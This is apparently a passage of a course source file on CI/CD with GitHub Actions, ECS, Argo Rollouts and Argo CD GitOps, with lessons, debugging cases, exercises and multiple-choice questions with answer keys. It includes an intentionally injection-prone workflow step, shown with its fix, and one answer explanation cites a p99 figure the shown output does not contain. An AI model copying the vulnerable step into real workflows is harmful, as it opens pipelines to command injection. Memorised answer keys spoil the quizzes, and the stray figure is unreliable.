    rolling      replace a few tasks or Pods at a time    a little         roll again        grows as it rolls
    blue-green   full new copy, switch traffic at once    100% briefly     switch back, fast everyone, at switch
    canary       small % of traffic, then more            a little         shift to 0%, fast the canary's share
    shadow       copy traffic to new, discard replies     up to 100%       nothing to undo   none (no user sees it)

Recreate is for things that cannot run two versions at once (a singleton worker). Rolling is the default on
ECS and Kubernetes and is fine for most internal services. Blue-green buys an instant switch back at the price of
double capacity for a while. Canary limits how many users meet a bad release, but only works if something
watches the canary.

## Rolling, with a brake

On ECS, minimumHealthyPercent and maximumPercent decide how many tasks are replaced at a time (on Kubernetes,
maxUnavailable and maxSurge). Health checks gate each step. Add the brakes ECS provides:

    "deploymentConfiguration": {
      "minimumHealthyPercent": 100,
      "maximumPercent": 200,
      "deploymentCircuitBreaker": { "enable": true, "rollback": true },
      "alarms": { "alarmNames": ["orders-api-5xx-high"], "enable": true, "rollback": true }
    }

The circuit breaker rolls back when new tasks keep failing to start or pass health checks; the alarms block rolls
back when a CloudWatch alarm fires during the deployment — the case where tasks are "healthy" but return errors.

## Blue-green

Two target groups behind one ALB listener: blue serves users, green gets the new version and a test listener for
smoke tests, then the listener switches. Keep blue running for a bake time (say 30 minutes) so switching back is
one action. On ECS this is CodeDeploy's blue/green deployment type, and ECS has since added a built-in blue/green
option — read the current ECS documentation before choosing. On Kubernetes: two Deployments and a Service whose
selector moves, or Argo Rollouts' blueGreen strategy. Watch long-lived connections and sessions; deregistration
delay drains them.

## Canary with automated analysis

The rule that makes a canary useful: **compare the canary with the stable version at the same time**, not with
a fixed number, and refuse to judge on too little traffic. canary.py (run in Python) applies Kiranakart's rule —
canary 5xx rate at most 1.5 times stable or 0.5%, whichever is larger, p99 under 400 ms, at least 500 requests:

    release 8d41e07
        5%  PASS         5xx 0.24% <= 0.50%, p99 220 ms
       25%  PASS         5xx 0.24% <= 0.50%, p99 230 ms
       50%  PASS         5xx 0.23% <= 0.50%, p99 228 ms
      -> promoted to 100%
    release 9b77c10
        5%  PASS         5xx 0.44% <= 0.50%, p99 230 ms
       25%  FAIL         5xx 1.50% > limit 0.50%
      -> abort: traffic back to stable, canary scaled to zero
    release at 03:00 IST
        5%  INCONCLUSIVE only 160 requests
      -> paused: too little traffic to judge; a human decides

9b77c10 looked fine at 5% and failed at 25%: steps exist because small samples are noisy. On Kubernetes, Argo
Rollouts does this with a Rollout (parsed with PyYAML, not run):

    apiVersion: argoproj.io/v1alpha1
    kind: Rollout
    metadata:
      name: orders-api
    spec:
      strategy:
        canary:
          steps:
            - setWeight: 5
            - pause: {duration: 10m}
            - analysis:
                templates:
                  - templateName: orders-error-rate
            - setWeight: 25
            - pause: {duration: 10m}

The AnalysisTemplate runs a PromQL query (5xx rate of the canary's Pods) every minute with successCondition
result[0] <= 0.005 and failureLimit 1; a failed analysis aborts the rollout and traffic returns to stable. On ECS,
weighted target groups on an ALB do the same split. Without a traffic router, Rollouts approximates weights with
replica counts.

## Migrations that survive a rollback

Rollback replaces code, not data. If release N renames a column, rolling back to N-1 crashes on the missing
column. **Expand, then contract** (expand.py, run with sqlite3):

    v1 after expand + v2 write: 4 Banjara Hills, Hyderabad
    v1 after one-step rename: no such column: addr
    columns after contract: ['id', 'delivery_address']

Release A adds delivery_address, backfills it and writes both columns; the old code still reads addr, so a
rollback is safe. Release B reads the new column. Release C, once no running version reads addr, drops it. Each
migration runs as its own step before the deploy, is backward compatible with the release before it, and
backfills big tables in batches.

## Feature flags: deploy is not release

A flag lets code reach production switched off and be switched on for 1%, a city, or staff. It separates
deploying (an engineering event) from releasing (a business event), and gives a **kill switch** that is faster
than any rollback. AWS AppConfig has feature flags; LaunchDarkly, Unleash and the OpenFeature SDKs are common.
Flags have costs: every flag doubles the paths to test, so each gets an owner and a removal date. A flag does
not help when the new code crashes on start-up — that is what the circuit breaker and canary are for.

**Sale days.** Kiranakart freezes deploys during the Diwali sale's peak hours; only flags are flipped, by named
people, with the change posted in the incident channel.`,
    workedExample: `**Scenario.** Kiranakart ships a new checkout-pricing service version a week before the Diwali sale. It runs on
EKS, takes 40% of the company's revenue path, and the release also changes how discounts are stored. Choose the
strategy and the rollback wiring.

**1. Strategy.** Canary with Argo Rollouts: 5%, 25%, 50%, each with a 10-minute pause and analysis, then 100%.
Rolling is too blunt for the revenue path; blue-green would expose every user at the switch.

**2. What the analysis watches.** Canary versus stable on checkout 5xx rate and p99 latency, plus a business
metric — orders placed per minute per Pod — because a pricing bug can return 200 OK with a wrong total.
Minimum 500 requests per step; schedule the release for 11:00 IST, not 03:00, so there is traffic to judge.

**3. Data.** The discount change ships as expand/contract over three releases: add discount_v2 and dual-write
now; switch reads next week after the sale; drop the old column in November.

**4. The kill switch.** The new discount rules sit behind a flag "pricing.v2_rules", default off. Rollout moves
code; marketing flips the flag for 5% of users in Bengaluru first.

**5. Freeze.** No deploys to checkout-pricing from 48 hours before the sale until it ends; only flag changes.

**Check.** If the 25% step fails, Rollouts aborts and traffic returns to stable; the expand migration keeps the
old version working; the flag is still off. Three independent ways back, none needing a 2 a.m. decision.
Rehearse the abort once in staging with a deliberately broken build, so the first real abort is not a surprise.`,
    mcqs: [
      mcq('Kiranakart\'s new release passed health checks, but returns 5xx on a quarter of checkout calls. Which ECS setting would roll it back automatically?', [
        ['A deployment alarm on the 5xx metric with rollback set to true', true],
        ['The deployment circuit breaker alone, with its rollback enabled', false],
        ['A minimumHealthyPercent of 100 so old tasks stay during the deploy', false],
        ['A higher maximumPercent so that more new tasks start at the same time', false],
      ], 'The circuit breaker reacts to tasks failing to start or pass health checks; these tasks are healthy but erroring, so only an alarm-based rollback catches it. minimumHealthyPercent and maximumPercent shape the rollout pace, not the decision to roll back.'),
      mcq('Release N renames orders.addr to delivery_address in one migration. What happens when the team rolls back to N-1?', [
        ['N-1 fails, because the column it reads no longer exists', true],
        ['RDS restores the old column name as part of the rollback', false],
        ['N-1 keeps working, since SQL resolves renamed columns itself', false],
        ['The rollback is refused by ECS until the migration is undone', false],
      ], 'Rollback swaps code only; the old code queries addr and gets "no such column", as expand.py showed. Databases do not undo migrations on a code rollback, SQL does not alias renamed columns, and ECS knows nothing about schemas.'),
      mcq('Why did canary.py report INCONCLUSIVE for the release made at 03:00 IST?', [
        ['The canary had fewer requests than the minimum needed to judge it', true],
        ['The stable version\'s error rate was higher than the canary\'s rate', false],
        ['The p99 latency of the canary was above the 400 ms upper limit', false],
        ['Canary analysis does not run outside of normal business hours', false],
      ], 'Only 160 requests reached the canary, below the 500 minimum, so the error rate means little. A lower canary error rate would pass, p99 was 190 ms, and the analysis has no notion of business hours — traffic is the issue.'),
    ],
    checkpoint: [
      mcq('Which strategy needs about double capacity for a while but lets Kiranakart switch every user back in one action?', [
        ['Blue-green, with the old environment kept for a bake time', true],
        ['Rolling, replacing a few tasks at a time behind the ALB', false],
        ['Recreate, stopping the old version before starting new', false],
        ['Canary, sending five per cent of traffic to the new version', false],
      ], 'Blue-green runs a full second copy and flips the listener back if needed. Rolling and canary use little extra capacity and roll back step by step, and recreate has no old version left to switch to.'),
      mcq('A canary compares its error rate with a fixed 1% threshold. During a partner bank outage, stable and canary both show 3% errors. What goes wrong?', [
        ['A healthy release is aborted, since it is not compared with stable', true],
        ['The canary is promoted, since equal error rates count as a pass', false],
        ['Nothing goes wrong, because a fixed threshold ignores outside causes', false],
        ['Argo Rollouts pauses for ever, because it cannot read the metric', false],
      ], 'Against a fixed number the canary fails for a cause outside the release; comparing with stable at the same time shows they are equal. Equal rates would pass only in a relative check, a fixed threshold reacts to every cause, and the metric is readable.'),
      mcq('What is the main value of a feature flag compared with a rollback?', [
        ['It turns a feature off in seconds without redeploying any code', true],
        ['It removes the need for tests, as broken features can be hidden', false],
        ['It protects against code that crashes the service at start-up', false],
        ['It keeps database schemas compatible across every past release', false],
      ], 'A flag separates release from deploy and acts as a kill switch. It doubles paths to test rather than removing tests, does nothing for a crash on start-up (the code still runs), and has no effect on schema compatibility.'),
    ],
  },

  /* ── GITOPS_ARGOCD ───────────────────────────────────────────────────────────────────── */
  {
    unitCode: 'CL_CICD_GITOPS_GITOPS_ARGOCD',
    notes: `In "GitHub Actions to AWS with OIDC" the EKS deploy ended with kubectl set image from CI: the pipeline held
credentials to the cluster and pushed changes into it. GitOps turns that around. The desired state of every
cluster lives in Git; an agent inside the cluster pulls it and keeps the cluster matching it. The OpenGitOps
project states four principles: the system is described **declaratively**, the description is **versioned and
immutable** (Git history), it is **pulled automatically** by agents, and it is **continuously reconciled**.

## Push or pull

    Question                         CI pushes (kubectl from CI)        GitOps (Argo CD pulls)
    who holds cluster credentials    the CI system                      only the agent in the cluster
    a manual kubectl edit            stays until the next deploy        detected, and reverted if self-heal is on
    "what is running?"               ask the cluster                    read the Git repository
    rollback                         re-run an old pipeline             git revert, reviewed like any change
    audit trail                      CI logs                            Git history: who, what, when, approved by

## Two repositories

Kiranakart keeps application code (orders-api, its Dockerfile, tests, CI) separate from **platform-config**, the
repository Argo CD watches. Separate repos mean CI's tag commits do not retrigger application CI, production
changes have their own reviewers, and the config repo's history is exactly the history of what ran.

    platform-config/
      apps/orders-api/base/          deployment.yaml, service.yaml, kustomization.yaml
      apps/orders-api/overlays/dev/  kustomization.yaml   (namespace orders-dev, image tag)
      apps/orders-api/overlays/prod/ kustomization.yaml   (namespace orders-prod, replicas, tag)
      argocd/                        project.yaml, orders-api-prod.yaml, appset.yaml

The prod overlay (Kustomize, built into kubectl):

    apiVersion: kustomize.config.k8s.io/v1beta1
    kind: Kustomization
    namespace: orders-prod
    resources:
      - ../../base
    replicas:
      - name: orders-api
        count: 4
    images:
      - name: 123456789012.dkr.ecr.ap-south-1.amazonaws.com/orders-api
        newTag: 3f9c21a

kubectl kustomize apps/orders-api/overlays/prod rendered it offline: namespace orders-prod on both objects,
replicas: 4, and image ...orders-api:3f9c21a. Helm charts (CL_KUBERNETES's "Packaging with Helm") work the same
way; Argo CD renders them itself.

## The Application

    apiVersion: argoproj.io/v1alpha1
    kind: Application
    metadata:
      name: orders-api-prod
      namespace: argocd
      finalizers:
        - resources-finalizer.argocd.argoproj.io
    spec:
      project: orders
      source:
        repoURL: https://github.com/kiranakart/platform-config.git
        targetRevision: main
        path: apps/orders-api/overlays/prod
      destination:
        server: https://kubernetes.default.svc
        namespace: orders-prod
      syncPolicy:
        automated:
          prune: true
          selfHeal: true
        syncOptions:
          - CreateNamespace=true
        retry:
          limit: 3
          backoff:
            duration: 10s
            factor: 2
            maxDuration: 2m

source says what (repo, branch, path); destination says where (this cluster's API server, a namespace).
**automated** syncs when Git changes; **prune** deletes objects removed from Git (without it they linger);
**selfHeal** reverts changes made in the cluster. The finalizer makes deleting the Application delete its
resources too. These manifests were parsed and checked for their fields with PyYAML; no cluster ran them.

## Two statuses, both needed

**Sync status** compares cluster with Git: Synced or OutOfSync. **Health status** says whether the resources
work: Healthy, Progressing, Degraded, Suspended or Missing. "Synced and Degraded" means Argo CD applied exactly
what Git says and what Git says is broken — the fix is a commit, not a re-sync.

## Drift, self-heal and the emergency change

At 21:00 during a sale someone runs kubectl scale --replicas=10 on orders-api. Without selfHeal, Argo CD marks the
app OutOfSync and leaves it; with selfHeal, it scales back to 4 within moments. The lesson is not "disable
self-heal"; it is that the emergency change goes through Git (a one-line PR, approved fast), or the team pauses
auto-sync on that one Application with a note in the incident channel and restores it afterwards. If an HPA owns
the replica count, take replicas out of Git, or tell Argo CD to ignore that field.

## Guardrails: the AppProject

An **AppProject** limits what an Application may do: which repositories it may read (sourceRepos), which clusters
and namespaces it may deploy to (destinations), and which kinds it may create — Kiranakart's "orders" project
allows Deployments, Services and ConfigMaps in orders-dev and orders-prod and no cluster-scoped objects. Argo CD
RBAC with SSO decides who may sync or roll back which project.

## How a new image gets into Git

CI builds and pushes 8d41e07 (as before), then its last step commits newTag: 8d41e07 to the **dev** overlay —
CI needs write access to one repository, and no cluster credentials at all. Promotion to production is a pull
request copying the tag (promote.py, run here):

    prod: 3f9c21a -> 8d41e07

After the PR merged, the rendered prod image was ...orders-api:8d41e07. Argo CD notices on its next poll (about
three minutes by default) or at once through a Git webhook, and syncs. Argo CD Image Updater can write the tag
for you; many teams prefer the explicit PR because the review is the approval.

## Ordering, secrets and many apps

- **Sync waves** (annotation argocd.argoproj.io/sync-wave: "-1") apply some objects first; a **PreSync hook**
  (argocd.argoproj.io/hook: PreSync) runs a database migration Job before the new Deployment.
- **Secrets** never go into Git as plain Secret objects (base64 is not encryption). The External Secrets
  Operator creates them from AWS Secrets Manager using an IAM role for the operator; Sealed Secrets stores only
  encrypted values.
- An **ApplicationSet** stamps out one Application per environment, cluster or team from a template (a list
  generator with env: dev and env: prod produces orders-api-dev and orders-api-prod).

**Flux** is the other CNCF GitOps tool, with the same ideas as Kustomization and HelmRelease objects; Azure's
AKS GitOps extension runs Flux. To practise, install Argo CD on a kind cluster from its documented stable
install manifest into the argocd namespace, and delete the kind cluster afterwards — no cloud bill.`,
    workedExample: `**Scenario.** Release 8d41e07 of orders-api has run in orders-dev for a day. Promote it to production by GitOps,
then roll it back when the 25% canary fails.

**1. The promotion PR.** In platform-config, change apps/orders-api/overlays/prod/kustomization.yaml newTag from
3f9c21a to 8d41e07 (promote.py printed "prod: 3f9c21a -> 8d41e07"). The PR shows a one-line diff; CODEOWNERS
requires an orders lead and an SRE to approve.

**2. Check before merge.** CI on the config repo runs kubectl kustomize on every overlay and validates the
output, so a broken overlay fails in the PR, not in Argo CD. The rendered prod image is
123456789012.dkr.ecr.ap-south-1.amazonaws.com/orders-api:8d41e07.

**3. Sync.** On merge, a webhook tells Argo CD; orders-api-prod goes OutOfSync, then syncs. Because the workload
is an Argo Rollouts Rollout, the change starts a canary rather than replacing every Pod.

**4. The failure.** The analysis at 25% fails; Rollouts aborts and traffic returns to the stable ReplicaSet. The
app is now Synced but Degraded: the cluster matches Git, and Git asks for a broken version.

**5. Roll back the GitOps way.** git revert the promotion commit, fast-tracked review, merge. Argo CD syncs
3f9c21a back; the Rollout becomes Healthy. History shows the promotion, the revert, and who approved both.

**6. What not to do.** kubectl set image in production to "fix it quickly": self-heal reverts it to whatever Git
says, and the record of what happened is lost. The fix for 8d41e07 goes through dev again as a new commit and a
new tag, and is promoted by the same kind of pull request.`,
    mcqs: [
      mcq('During Kiranakart\'s sale, an engineer runs kubectl scale to 10 replicas on an Argo CD application with selfHeal on and replicas: 4 in Git. What happens?', [
        ['Argo CD detects the drift and scales the Deployment back to 4', true],
        ['Argo CD updates Git to 10 so that the repository matches the cluster', false],
        ['The Deployment stays at 10 until somebody presses Sync in the UI', false],
        ['Argo CD deletes the Deployment, since prune removes drifted objects', false],
      ], 'Self-heal reconciles the cluster to Git, so the manual change is undone. Argo CD never writes cluster state back to Git, waiting for a manual sync is the behaviour without selfHeal, and prune deletes objects removed from Git, not drifted ones.'),
      mcq('Argo CD shows orders-api-prod as Synced and Degraded. What does that tell the on-call engineer?', [
        ['The cluster matches Git, and the version Git asks for is broken', true],
        ['Argo CD failed to apply the manifests and needs a manual re-sync', false],
        ['Someone changed the cluster by hand and self-heal is switched off', false],
        ['The repository could not be reached, so status is from a cache', false],
      ], 'Synced means applied as described; Degraded means the resources are unhealthy, so the fix is in Git (revert or fix forward). A failed apply or manual drift would show OutOfSync, and an unreachable repo shows a comparison error.'),
      mcq('In Kiranakart\'s GitOps setup, what access does the application CI pipeline need?', [
        ['Write access to the platform-config repository, and no cluster access', true],
        ['Cluster-admin on every EKS cluster, to apply manifests after builds', false],
        ['Read access to the Argo CD API, to trigger a sync after each push', false],
        ['The Argo CD admin password, so it can create Applications as needed', false],
      ], 'In the pull model CI only changes Git (the image tag); the agent inside the cluster applies it. Giving CI cluster-admin brings back the push model\'s risk, a sync trigger is optional (webhooks exist), and CI should never hold Argo CD admin credentials.'),
    ],
    checkpoint: [
      mcq('Which pair of Argo CD sync policy settings deletes objects removed from Git and reverts manual changes?', [
        ['prune: true and selfHeal: true under automated', true],
        ['CreateNamespace=true and retry with a limit of 3', false],
        ['targetRevision: main and a webhook from GitHub', false],
        ['A finalizer and the project set to "default"', false],
      ], 'prune removes resources no longer in Git and selfHeal reverts drift. CreateNamespace and retry handle namespaces and failures, targetRevision and webhooks decide what and when to fetch, and the finalizer governs deleting the Application.'),
      mcq('A team stores a Kubernetes Secret manifest in the GitOps repository with base64 values "because it is encoded". What is the better design?', [
        ['External Secrets Operator creating the Secret from Secrets Manager', true],
        ['Keep the Secret in Git but make the repository private to the team', false],
        ['Encode the values twice in base64 before committing the manifest', false],
        ['Put the values in a ConfigMap instead, which Argo CD does not show', false],
      ], 'base64 is encoding, not encryption; the operator keeps the value in a secret manager and Git holds only a reference. A private repo still spreads the secret to every clone and backup, double encoding is still readable, and ConfigMaps are less protected, not more.'),
      mcq('How does Kiranakart promote orders-api from dev to production under GitOps?', [
        ['A reviewed pull request that changes the prod overlay\'s image tag', true],
        ['Running the build pipeline again with a production flag set on it', false],
        ['Clicking Sync on the production app so that it pulls the dev image', false],
        ['Copying the dev namespace\'s Deployment into prod with kubectl get', false],
      ], 'Promotion is a Git change, so it is reviewed, recorded and revertible, and it points at the same digest. Rebuilding breaks build-once, Sync only applies what the prod path already says, and copying live objects bypasses Git entirely.'),
    ],
  },

  /* ── DEBUGGING ───────────────────────────────────────────────────────────────────────── */
  {
    unitCode: 'CL_CICD_GITOPS_DEBUGGING',
    notes: `Six things that go wrong between a merge and a healthy release at Kiranakart. For each: the symptom, the cause, and
the one change that fixes it. Pipelines fail loudly but vaguely ("exit code 1"), so the habit is to scroll up to
the first real error and read it. Outputs marked (run) came from PyYAML or boto3 against moto; the rest describe
GitHub, AWS and Argo CD behaviour from their documentation.

## 1. The workflow that never starts (run)

**Symptom.** After a small edit, the Actions tab shows "Invalid workflow file" and no job runs. Checked locally:

    yaml.scanner.ScannerError: mapping values are not allowed here
      in "wf/bad.yml", line 13, column 25

**Cause.** Line 13 is run: echo "Title: \${{ github.event.pull_request.title }}". The value starts unquoted, so
YAML reads the ": " after Title as a new key inside a plain scalar.

**Fix.** Use a block scalar (run: | and the command on the next line) or quote the whole value. And because this
line interpolates a PR title into shell, also move the title into env: (see SUPPLY_CHAIN). Lint workflow files in
the PR (actionlint does this well) so the error appears before merge.

## 2. "Not authorized to perform sts:AssumeRoleWithWebIdentity"

**Symptom.** The deploy job worked for months. Someone added environment: production to it for approvals; now
configure-aws-credentials fails with that message.

**Cause.** With an environment on the job, the token's sub became
repo:kiranakart/orders-api:environment:production, while the trust policy still requires
repo:kiranakart/orders-api:ref:refs/heads/main.

**Fix.** Change the trust condition to the environment form (with StringEquals), and set the environment's
deployment branch rule to main so the ref is still controlled. Do not "fix" it with a wildcard sub.

## 3. A cache that never hits

**Symptom.** Every run downloads all Python packages; the cache step always reports a miss and saves a new
entry.

**Cause.** key: pip-\${{ github.sha }}. Every commit has a new SHA, so every key is new.

**Fix.** Key on what decides the contents: key: pip-\${{ hashFiles('requirements*.txt') }} with a restore-keys:
pip- fallback, or simply setup-python's cache: pip, which does this for you.

## 4. Re-running a job breaks the push (run, with a moto caveat)

**Symptom.** A flaky deploy job is re-run; now the build job fails pushing orders-api:3f9c21a to ECR.

**Cause.** The repository has immutable tags, and the re-run rebuilt the image — not bit-identical (timestamps,
a newer base layer), so a different digest under the same tag. AWS rejects it with ImageTagAlreadyExistsException.
moto raised its own ImageAlreadyExistsException for the same attempt, so expect a different name there.

**Fix.** Make the job idempotent: before building, check whether the tag exists (aws ecr describe-images or
boto3's describe_images) and skip the build and push if it does. Immutable tags are working as intended; never
"fix" this by making the repository mutable.

## 5. The ECS deploy that waits, then fails

**Symptom.** amazon-ecs-deploy-task-definition with wait-for-service-stability runs for many minutes and fails.
The service is back on the old task definition.

**Cause.** The service events (aws ecs describe-services, the events list) show tasks registered with the target
group and then "(service orders-api) (task ...) is unhealthy in (target-group ...) due to (reason Health checks
failed with these codes: [404])". The new version moved its health endpoint to /healthz; the target group still
checks /health. The deployment circuit breaker rolled back, as designed.

**Fix.** Align the target group's health check path with the app (in Terraform, reviewed), or keep /health
working during the change. The pipeline did the right thing by failing; the bug was the mismatch.

## 6. Argo CD OutOfSync for ever after adding an HPA

**Symptom.** orders-api-prod flips between Synced and OutOfSync every few minutes; the diff shows only
spec.replicas.

**Cause.** The prod overlay sets replicas: 4 and an HPA now scales the Deployment to 7. Argo CD sees drift and,
with selfHeal, sets it back to 4; the HPA scales up again. They fight, and Pods churn.

**Fix.** Let one owner hold the number. Remove the replicas entry from Git, or tell Argo CD to ignore it:

    spec:
      ignoreDifferences:
        - group: apps
          kind: Deployment
          jsonPointers:
            - /spec/replicas
      syncPolicy:
        syncOptions:
          - RespectIgnoreDifferences=true

The second option is needed because ignoreDifferences alone affects the diff but not what a sync applies.

## The habit

Each fix changed one thing, after reading one piece of evidence: the YAML error's line and column, the sub
claim, the cache key, the push error, the ECS service events, the Argo CD diff. Re-running a pipeline until it
goes green is not debugging.`,
    mcqs: [
      mcq('A Kiranakart workflow edit produces "mapping values are not allowed here" on a run: line containing echo "Status: done". What is the fix?', [
        ['Use run: | with the command on the next line, or quote the whole value', true],
        ['Escape the colon as \\: so that GitHub treats it as a literal character', false],
        ['Move the step into a separate job, since one job allows only one colon', false],
        ['Replace the double quotes with single quotes inside the echo command', false],
      ], 'The unquoted value contains ": ", which YAML reads as a mapping; a block scalar or a fully quoted value makes it plain text. YAML has no \\: escape, jobs do not limit colons, and swapping inner quote style leaves the outer value unquoted.'),
      mcq('An actions/cache step uses key: deps-${{ github.sha }} and never gets a hit. What should the key be based on?', [
        ['A hash of the lockfile or requirements files', true],
        ['The run number, so each run has a unique key', false],
        ['The branch name, so every branch shares a key', false],
        ['The current date, so the cache refreshes daily', false],
      ], 'The cache contents depend on the dependency files, so their hash gives hits while they are unchanged and a new entry when they change. Run numbers and SHAs never repeat, a branch key serves stale dependencies after an upgrade, and a date key misses after every upgrade within a day too.'),
      mcq('After a re-run, the build job fails to push orders-api:3f9c21a with ImageTagAlreadyExistsException. What is the right fix?', [
        ['Skip the build and push when that tag already exists in ECR', true],
        ['Make the ECR repository\'s tags mutable so re-runs can overwrite', false],
        ['Delete the existing image from ECR before every push in the job', false],
        ['Tag the image latest as well, so the push has a tag that is new', false],
      ], 'The image for this commit is already in ECR; an idempotent job reuses it. Mutable tags or deleting images break the guarantee that a tag names one image, and adding latest does not stop the immutable-tag rejection.'),
      mcq('Argo CD and an HPA keep fighting over spec.replicas. Besides ignoreDifferences, what is needed so syncs leave the field alone?', [
        ['The sync option RespectIgnoreDifferences=true on the Application', true],
        ['Turning off prune, so that Argo CD stops touching the replicas field', false],
        ['Setting the HPA\'s minReplicas equal to the value stored in the Git repo', false],
        ['Adding a sync wave annotation so the HPA is applied before the Deployment', false],
      ], 'ignoreDifferences hides the field from the diff, but a sync still applies the full manifest unless RespectIgnoreDifferences is set. Prune is about deleted objects, matching minReplicas still lets the HPA scale above it, and ordering does not stop the overwrite.'),
    ],
  },

  /* ── PRACTICE ────────────────────────────────────────────────────────────────────────── */
  {
    unitCode: 'CL_CICD_GITOPS_PRACTICE',
    notes: `Nine exercises, easiest first. Write your answer before reading ours. The arithmetic was checked in Python; the
YAML and JSON answers were parsed.

## 1. Name the sub claim (easy)

Repository kiranakart/payments-api. Give the sub for: (a) a push to main; (b) a pull_request run; (c) a job with
environment: staging; (d) a push of tag v3.1.0.

**Answer.** (a) repo:kiranakart/payments-api:ref:refs/heads/main (b) repo:kiranakart/payments-api:pull_request
(c) repo:kiranakart/payments-api:environment:staging (d) repo:kiranakart/payments-api:ref:refs/tags/v3.1.0.

## 2. The four keys (easy)

In four weeks: 12 production deploys, 3 of which caused an incident or rollback. Deployment frequency and change
failure rate?

**Answer.** 3 per week; 3 / 12 = 25%.

## 3. Find the rebuild (easy)

A pipeline: build image → test → deploy staging → build image with --no-cache → deploy production. What is wrong
and what replaces the second build?

**Answer.** Production gets an untested artefact. Delete the second build; the production job deploys the digest
the first build pushed and staging verified.

## 4. A read-only role for pull requests (medium)

Pull requests in kiranakart/infra need a role that can run terraform plan (read-only). Write the trust
condition block.

**Answer.**

    "Condition": { "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:kiranakart/infra:pull_request" } }

Attach read-only permissions (plus read access to the state bucket and lock). PRs from forks do not get secrets,
and the role must never be able to apply.

## 5. Least privilege for the ECS deploy role (medium)

Which of these does the orders-api deploy role need? ecs:UpdateService, ecs:DeleteService,
ecs:RegisterTaskDefinition, iam:PassRole on "*", iam:PassRole on the two task roles, ecr:GetAuthorizationToken,
ec2:RunInstances.

**Answer.** ecs:UpdateService (on the one service), ecs:RegisterTaskDefinition, iam:PassRole on the two task role
ARNs with iam:PassedToService = ecs-tasks.amazonaws.com. The deploy role does not push, so
ecr:GetAuthorizationToken belongs to the build role. Never DeleteService, PassRole on "*" or RunInstances.

## 6. Canary arithmetic (medium)

Rule: canary 5xx rate at most 1.5 × stable or 0.5%, whichever is larger. Stable runs at 0.4%. The canary served
2,000 requests with 13 errors. Pass or fail?

**Answer.** Limit = max(0.6%, 0.5%) = 0.6%. Canary = 13 / 2,000 = 0.65%. Fail — abort and return traffic to
stable.

## 7. Expand and contract (medium)

Customers' name must be split into first_name and last_name with no downtime and safe rollbacks. Plan the
releases.

**Answer.** R1: add first_name and last_name (nullable), backfill in batches, write all three. R2: read the new
columns, still write all three. R3 (after R1 is no longer a rollback target): stop writing name. R4: drop name.

## 8. Fix the injection (medium)

    - run: ./notify.sh "\${{ github.event.issue.title }}"

**Answer.**

    - run: ./notify.sh "$ISSUE_TITLE"
      env:
        ISSUE_TITLE: \${{ github.event.issue.title }}

The title now arrives as data in an environment variable, quoted, instead of becoming part of the script.

## 9. A staging Application (harder)

Write the spec of an Argo CD Application that deploys apps/orders-api/overlays/staging from platform-config's
main branch into orders-staging in the same cluster, auto-syncing, pruning and self-healing, in project orders.

**Answer.**

    spec:
      project: orders
      source:
        repoURL: https://github.com/kiranakart/platform-config.git
        targetRevision: main
        path: apps/orders-api/overlays/staging
      destination:
        server: https://kubernetes.default.svc
        namespace: orders-staging
      syncPolicy:
        automated:
          prune: true
          selfHeal: true

The orders AppProject must also list orders-staging in its destinations, or the sync is refused.`,
    mcqs: [
      mcq('A job in kiranakart/payments-api has environment: staging. What sub must its role\'s trust policy expect?', [
        ['repo:kiranakart/payments-api:environment:staging', true],
        ['repo:kiranakart/payments-api:ref:refs/heads/staging', false],
        ['repo:kiranakart/payments-api:pull_request:staging', false],
        ['environment:staging:repo:kiranakart/payments-api', false],
      ], 'Jobs that name an environment get the environment form of sub. The ref form is for jobs without an environment, pull_request has no suffix, and the claim always starts with repo:owner/name.'),
      mcq('Stable is at 0.4% errors. A canary serves 2,000 requests with 13 errors, under the 1.5x-or-0.5% rule. What is the decision?', [
        ['Fail: 0.65% is above the 0.6% limit', true],
        ['Pass: 0.65% is below 1.5 × 0.5% limit', false],
        ['Pass: the limit is 0.5% and 0.65% is close', false],
        ['Inconclusive: 2,000 requests are too few', false],
      ], 'The limit is the larger of 1.5 × 0.4% = 0.6% and 0.5%, so 0.6%; 13/2,000 = 0.65% exceeds it. The rule multiplies stable\'s rate, not the floor, "close" is not a pass, and 2,000 is above the 500-request minimum.'),
      mcq('Twelve production deploys in four weeks, three causing incidents. What is the change failure rate?', [
        ['25%', true],
        ['3%', false],
        ['75%', false],
        ['12%', false],
      ], 'Change failure rate is failed changes divided by all changes: 3 / 12 = 25%. Three is a count, 75% is the success share, and 12 is the number of deploys.'),
      mcq('Which permission belongs on the build role rather than on Kiranakart\'s ECS deploy role?', [
        ['ecr:GetAuthorizationToken, with the push actions on the repository', true],
        ['ecs:RegisterTaskDefinition, to record the new image in a revision', false],
        ['iam:PassRole on the task roles, limited to ecs-tasks.amazonaws.com', false],
        ['ecs:UpdateService on the orders-api service in the orders-prod cluster', false],
      ], 'Logging in to ECR and pushing is the build job\'s work. The deploy role registers the task definition, passes the two task roles to ECS and updates the service.'),
      mcq('Splitting customers.name into first_name and last_name, when is it safe to drop the name column?', [
        ['When no release that might be rolled back to still reads or writes it', true],
        ['Right after the backfill completes in the very first migration release', false],
        ['In the same release that starts reading the two new columns from code', false],
        ['Never, because dropping columns in production cannot be done online', false],
      ], 'Contract only when every version you might run again no longer depends on the column. Dropping right after the backfill or with the read switch breaks a rollback, and columns can be dropped online once nothing uses them.'),
    ],
  },

  /* ── INTERVIEW_QUESTION ──────────────────────────────────────────────────────────────── */
  {
    unitCode: 'CL_CICD_GITOPS_INTERVIEW_QUESTION',
    notes: `Asked in DevOps, cloud and SRE interviews at product companies, GCCs and start-ups in Bengaluru, Hyderabad and
Pune. Say each answer aloud in about two minutes, then compare. Interviewers listen for whether you build once,
whether you know what holds which credential, and whether your rollback story includes the database.

## Q1. "Walk me through a CI/CD pipeline you would build for a microservice on AWS."

**Model answer.** "On every pull request: lint, unit tests, dependency and secret scanning — required checks with
a merge queue. On merge to main: build the image once, tag it with the commit, push it to ECR with immutable
tags, scan it and keep the digest. Deploy that digest to staging automatically, run smoke tests and a few API
journeys. Production is an approval in a GitHub environment, then a canary — 5%, 25%, 50% — compared with stable
on error rate and latency, with automatic rollback. Every deploy writes a record with the digest and commit. AWS
access is OIDC federation, one role per stage, no stored keys. I would track the DORA four keys to see whether it
is getting better."

**Follow-up.** "Your pipeline takes 35 minutes. What do you do?" — "Measure each stage first. Usually it is an
uncached dependency install, a Docker build without a layer cache, or one slow test suite. Cache on the lockfile,
use Buildx's cache, run independent jobs in parallel, split the slow suite and move the long end-to-end tests to
staging."

## Q2. "How do you deploy to AWS from GitHub Actions without storing access keys?"

